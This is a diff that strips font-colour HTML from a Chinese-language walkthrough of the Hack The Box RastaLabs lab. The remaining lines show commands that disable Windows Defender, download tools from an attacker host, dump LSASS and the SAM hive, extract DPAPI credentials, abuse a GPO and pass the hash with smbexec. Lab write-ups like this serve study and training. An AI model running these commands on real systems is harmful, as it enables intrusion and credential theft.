@@ -8684,7 +8684,7 @@ meterpreter > download C:\\Users\\Public\\20260315143135_BloodHound.zip
 
 # SRV01-10.10.120.15-RLAB\NGODFREY
 ## Bloodhound
-在bloodhound查询**<font style="color:rgb(13, 13, 13);">AS-REP Roasting</font>**
+在bloodhound查询**AS-REP Roasting**
 
 ```plain
 MATCH (u:User {dontreqpreauth:true}) RETURN u
@@ -9389,7 +9389,7 @@ Info: Establishing connection to remote endpoint
 
 俩个文件不足以访问，还需要一个管理密码
 
-### <font style="color:rgb(51, 51, 51);">keethief</font>
+### keethief
 #### 下载上传
 [KeeThief/PowerShell/KeeThief.ps1 at master · GhostPack/KeeThief](https://github.com/GhostPack/KeeThief/blob/master/PowerShell/KeeThief.ps1)
 
@@ -10000,27 +10000,27 @@ C:\WINDOWS\system32>whoami
 nt authority\system
 ```
 
-### **<font style="color:rgb(6, 10, 38);">1. 禁用实时保护</font>**
+### **1. 禁用实时保护**
 ```plain
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 ```
 
-### **<font style="color:rgb(6, 10, 38);">2. 禁用行为监控</font>**
+### **2. 禁用行为监控**
 ```plain
 powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"
 ```
 
-### **<font style="color:rgb(6, 10, 38);">3. 禁用云保护</font>**
+### **3. 禁用云保护**
 ```plain
 powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"
 ```
 
-### **<font style="color:rgb(6, 10, 38);">4. 添加排除路径</font>**
+### **4. 添加排除路径**
 ```plain
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public'"
 ```
 
-### **<font style="color:rgb(6, 10, 38);">5. 验证 Defender 状态</font>**
+### **5. 验证 Defender 状态**
 ```plain
 powershell -Command "Get-MpPreference | Select-Object DisableRealtimeMonitoring"
 DisableRealtimeMonitoring
@@ -10028,12 +10028,12 @@ DisableRealtimeMonitoring
                     False
 ```
 
-禁用失败了<font style="color:rgb(6, 10, 38);">❌</font><font style="color:rgb(6, 10, 38);"> </font>**<font style="color:rgb(6, 10, 38);">Defender 被组策略锁定了！</font>**
+禁用失败了❌ **Defender 被组策略锁定了！**
 
-<font style="color:rgb(6, 10, 38);">说明管理员通过 GPO 强制启用了 Defender</font>
+说明管理员通过 GPO 强制启用了 Defender
 
-## WS02-<font style="color:rgb(6, 10, 38);">Procdump(失败)</font>
-`<font style="color:rgb(6, 10, 38);">procdump.exe</font>`<font style="color:rgb(6, 10, 38);"> 是微软 Sysinternals 官方工具，有有效数字签名，</font>**<font style="color:rgb(6, 10, 38);">不会被 Defender 拦截</font>**<font style="color:rgb(6, 10, 38);">。</font>
+## WS02-Procdump(失败)
+`procdump.exe` 是微软 Sysinternals 官方工具，有有效数字签名，**不会被 Defender 拦截**。
 
 ```plain
 Invoke-WebRequest -Uri http://10.10.16.2:443/procdump64.exe -OutFile C:\Users\Public\procdump.exe
@@ -10044,16 +10044,16 @@ C:\WINDOWS\system32>C:\Users\Public\procdump.exe -accepteula -ma lsass.exe C:\Us
 Access is denied.
 ```
 
-`<font style="color:rgb(6, 10, 38);">Access is denied</font>`<font style="color:rgb(6, 10, 38);"> 说明目标机器启用了 </font>**<font style="color:rgb(6, 10, 38);">LSA Protection (RunAsPPL)</font>**<font style="color:rgb(6, 10, 38);">，即使 SYSTEM 权限也无法直接 dump lsass.exe</font>
+`Access is denied` 说明目标机器启用了 **LSA Protection (RunAsPPL)**，即使 SYSTEM 权限也无法直接 dump lsass.exe
 
-## <font style="color:rgb(6, 10, 38);">WS02-</font><font style="color:rgb(6, 10, 38);">注册表Hive提取(失败)</font>
+## WS02-注册表Hive提取(失败)
 ```plain
 C:\WINDOWS\system32>reg save HKLM\SAM C:\Users\Public\SAM.hive
 Access is denied.
 ```
 
 ## WS02-nanodump
-<font style="color:rgb(6, 10, 38);">NanoDump 是专门设计绕过 PPL 保护的轻量级工具。</font>
+NanoDump 是专门设计绕过 PPL 保护的轻量级工具。
 
 [GitHub - fortra/nanodump: The swiss army knife of LSASS dumping](https://github.com/helpsystems/nanodump)
 
@@ -10488,8 +10488,8 @@ luid 999
 
 ```
 
-## Getflag-WS02-<font style="color:rgb(6, 10, 38);">Credential Manager</font>
-<font style="color:rgb(6, 10, 38);">在 </font>**<font style="color:rgb(6, 10, 38);">pypykatz</font>**<font style="color:rgb(6, 10, 38);"> 的输出中，找到了存储在 </font>**<font style="color:rgb(6, 10, 38);">Credential Manager</font>**<font style="color:rgb(6, 10, 38);"> 中的 flag：</font>
+## Getflag-WS02-Credential Manager
+在 **pypykatz** 的输出中，找到了存储在 **Credential Manager** 中的 flag：
 
 ```plain
 == CREDMAN [453e2]==
@@ -10682,7 +10682,7 @@ RASTA{wh3r3_w45_2f4_!?}
 >   不匹配，说明那个 masterkey 在 dump 的时候没被加载到内存里。
 >
 
-### <font style="color:rgb(6, 10, 38);">epugh-DPAPI MasterKey</font>
+### epugh-DPAPI MasterKey
 ```plain
 == LogonSession ==
 authentication_id 283618 (453e2)
@@ -10744,7 +10744,7 @@ luid 283618
 
 ```
 
-### **<font style="color:rgb(6, 10, 38);">枚举 Credential 文件</font>**
+### **枚举 Credential 文件**
 ```latex
 *Evil-WinRM* PS C:\Users\Administrator\Documents> Get-ChildItem "C:\Users\epugh\AppData\Local\Microsoft\Credentials\" -Force
 
@@ -10758,7 +10758,7 @@ Mode                 LastWriteTime         Length Name
 
 ```
 
-### 下载<font style="color:rgb(6, 10, 38);">Credential 文件</font>
+### 下载Credential 文件
 ```plain
 *Evil-WinRM* PS C:\Users\Administrator\Documents> $bytes = [System.IO.File]::ReadAllBytes("C:\Users\epugh\AppData\Local\Microsoft\Credentials\936A68B5AC87C545C4A22D1AF264C8E9")
 [System.Convert]::ToBase64String($bytes)
@@ -10771,7 +10771,7 @@ cd /home/kali/Desktop/htb/rastalabs/cred
 echo "AQAAAKgBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAkqTGfeI2LUy+Zrop0mPdogAAACAwAAAATABvAGMAYQBsACAAQwByAGUAZABlAG4AdABpAGEAbAAgAEQAYQB0AGEADQAKAAAAA2YAAMAAAAAQAAAAA6D8op74QvIicJrHGPPglQAAAAAEgAAAoAAAABAAAACVD3N5cQToscoqBcYMwluq8AAAAH/40rWMdlDf0WCGaygtTfGQ0TBMAsgMsAwoV3KWm3VzYRkSedGgIijXoXTkXw/ZQhGKem/eTgUMeEDZKxJBKt4CFLzKy/MkS8YMHxTDeIOFhklkB3x9568P30jYbBfJyBbCW092QHZ4AN/7BluUyKflwmbsa0QNjJVWmCFs9wO3ay7qTWNeYmYRvQpuThrEMVbNvtXPWtglZ0UXqO4qaYS6dqKcHbxbRVwnnglDxm4R4iNbDsjlaRs4ou0/M4/IIKWPDK2pfmq/e0Lf0dZrUmnfffjlJGmRPHM96b3oqJfYkc520I8+qoGtF8UIIiNPwhQAAACVh4OXqAcFFTeWNyIG8mtrTod+Yg==" | base64 -d > 936A68B5AC87C545C4A22D1AF264C8E9
 ```
 
-### 解密<font style="color:rgb(6, 10, 38);">Credential 文件</font>
+### 解密Credential 文件
 #### SID-Nanodump
 ```plain
 == LogonSession ==
@@ -11932,7 +11932,7 @@ computer configuration -- policies -- windows settings -- security settings -- r
 ### 确定应用
 ![](/image/hackthebox-prolabs/RastaLabs-32.png)
 
-### 右键<font style="color:rgb(57, 58, 52);background-color:rgba(17, 17, 51, 0.02);">Member Servers OU选择 Link an Existing GPO</font>
+### 右键Member Servers OU选择 Link an Existing GPO
 这一步把 GPO 链接到父 OU，这样我们就是FS,MX,SQL,SRV的管理员了
 
 ![](/image/hackthebox-prolabs/RastaLabs-33.png)
@@ -13014,7 +13014,7 @@ Mode                 LastWriteTime         Length Name
 ```
 
 ### startup.bat
-#### <font style="color:rgb(6, 10, 38);">使用 takeown 获取所有权</font>
+#### 使用 takeown 获取所有权
 ```plain
 # 获取文件所有权
 takeown /f "C:\Users\rweston\Start Menu\Programs\Startup\startup.bat"
@@ -13856,8 +13856,8 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\heathc1iff\Documents> 
 ```
 
-### <font style="color:rgb(6, 10, 38);">Slack IndexedDB-</font>查看缓存日志
-**<font style="color:rgb(6, 10, 38);">Slack</font>**<font style="color:rgb(6, 10, 38);"> 是一款流行的</font>**<font style="color:rgb(6, 10, 38);">企业级即时通讯和协作平台</font>**<font style="color:rgb(6, 10, 38);">，主要用于团队沟通、项目协作和信息共享。</font>
+### Slack IndexedDB-查看缓存日志
+**Slack** 是一款流行的**企业级即时通讯和协作平台**，主要用于团队沟通、项目协作和信息共享。
 
 ```plain
 *Evil-WinRM* PS C:\Users\heathc1iff\Documents> dir C:\Users\tquinn\AppData\Roaming\slack\IndexedDB\https_app.slack.com_0.indexeddb.leveldb
@@ -13876,16 +13876,16 @@ Mode                 LastWriteTime         Length Name
 -a----         3/19/2020  11:50 PM             23 MANIFEST-000001
 ```
 
-| **<font style="color:rgb(6, 10, 38);">组成部分</font>** | **<font style="color:rgb(6, 10, 38);">含义</font>** |
+| **组成部分** | **含义** |
 | :--- | :--- |
-| `<font style="color:rgb(6, 10, 38);">tquinn</font>` | <font style="color:rgb(6, 10, 38);">目标用户名</font> |
-| `<font style="color:rgb(6, 10, 38);">slack</font>` | <font style="color:rgb(6, 10, 38);">Slack 桌面客户端数据目录</font> |
-| `<font style="color:rgb(6, 10, 38);">IndexedDB</font>` | <font style="color:rgb(6, 10, 38);">浏览器式本地存储</font> |
-| `<font style="color:rgb(6, 10, 38);">https_app.slack.com_0</font>` | <font style="color:rgb(6, 10, 38);">Slack Web 应用域</font> |
-| `<font style="color:rgb(6, 10, 38);">leveldb</font>` | <font style="color:rgb(6, 10, 38);">LevelDB 数据库格式</font> |
+| `tquinn` | 目标用户名 |
+| `slack` | Slack 桌面客户端数据目录 |
+| `IndexedDB` | 浏览器式本地存储 |
+| `https_app.slack.com_0` | Slack Web 应用域 |
+| `leveldb` | LevelDB 数据库格式 |
 
 
-### <font style="color:rgb(6, 10, 38);">Getflag</font>
+### Getflag
 日志提取flag
 
 ```plain
@@ -14120,7 +14120,7 @@ umbraco
 (5 rows affected)
 ```
 
-尝试rdp但是rdp不上去，看了下wp发现<font style="color:rgb(57, 58, 52);background-color:rgba(17, 17, 51, 0.02);">epugh_adm对sqlserver有权限，</font>直接在域控给<font style="color:rgb(57, 58, 52);background-color:rgba(17, 17, 51, 0.02);">epugh_adm提权</font>
+尝试rdp但是rdp不上去，看了下wp发现epugh_adm对sqlserver有权限，直接在域控给epugh_adm提权
 
 ```plain
 net user epugh_adm NewPass123! /domain
@@ -14218,7 +14218,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\heathc1iff\Documents>
 ```
 
-### 挂载<font style="color:rgb(0, 0, 0);">ahope</font>
+### 挂载ahope
 ```plain
 ┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/rastalabs]
 └─# proxychains -q impacket-smbexec rweston_da@10.10.120.5 -hashes :3ff61fa259deee15e4042159d7b832fa 
@@ -14312,19 +14312,19 @@ YWUNCg==
 ```
 
 ### 格式更改
-<font style="color:rgb(6, 10, 38);">你当前的</font><font style="color:rgb(6, 10, 38);"> </font>`<font style="color:rgb(6, 10, 38);">nix01.ppk</font>`<font style="color:rgb(6, 10, 38);"> </font><font style="color:rgb(6, 10, 38);">文件</font>**<font style="color:rgb(6, 10, 38);">被错误地封装成了 PEM 证书格式</font>**<font style="color:rgb(6, 10, 38);">（带有</font><font style="color:rgb(6, 10, 38);"> </font>`<font style="color:rgb(6, 10, 38);">-----BEGIN CERTIFICATE-----</font>`<font style="color:rgb(6, 10, 38);"> </font><font style="color:rgb(6, 10, 38);">头）。</font>
+你当前的 `nix01.ppk` 文件**被错误地封装成了 PEM 证书格式**（带有 `-----BEGIN CERTIFICATE-----` 头）。
 
-+ <font style="color:rgb(6, 10, 38);">里面的 Base64 内容解码后才是真正的</font><font style="color:rgb(6, 10, 38);"> </font>`<font style="color:rgb(6, 10, 38);">.ppk</font>`<font style="color:rgb(6, 10, 38);"> </font><font style="color:rgb(6, 10, 38);">文件内容。</font>
-+ `<font style="color:rgb(6, 10, 38);">puttygen</font>`<font style="color:rgb(6, 10, 38);"> 无法识别这种“证书外壳”，因为它期望直接看到 </font>`<font style="color:rgb(6, 10, 38);">PuTTY-User-Key-File-2:</font>`<font style="color:rgb(6, 10, 38);"> 开头的内容。</font>
++ 里面的 Base64 内容解码后才是真正的 `.ppk` 文件内容。
++ `puttygen` 无法识别这种“证书外壳”，因为它期望直接看到 `PuTTY-User-Key-File-2:` 开头的内容。
 
-<font style="color:rgb(6, 10, 38);">使用 </font>`<font style="color:rgb(6, 10, 38);">sed</font>`<font style="color:rgb(6, 10, 38);"> 去掉头尾，再用 </font>`<font style="color:rgb(6, 10, 38);">base64</font>`<font style="color:rgb(6, 10, 38);"> 解码：</font>
+使用 `sed` 去掉头尾，再用 `base64` 解码：
 
 ```plain
 # 1. 去掉首尾行，提取纯 Base64 内容，然后解码保存为真正的 ppk 文件
 sed '1d;$d' nix01.ppk | base64 -d > nix01_real.ppk
 ```
 
-### <font style="color:rgb(6, 10, 38);">转换为 OpenSSH 格式</font>
+### 转换为 OpenSSH 格式
 ```plain
 puttygen nix01_real.ppk -O private-openssh -o nix01-id_rsa
 chmod 600 nix01-id_rsa
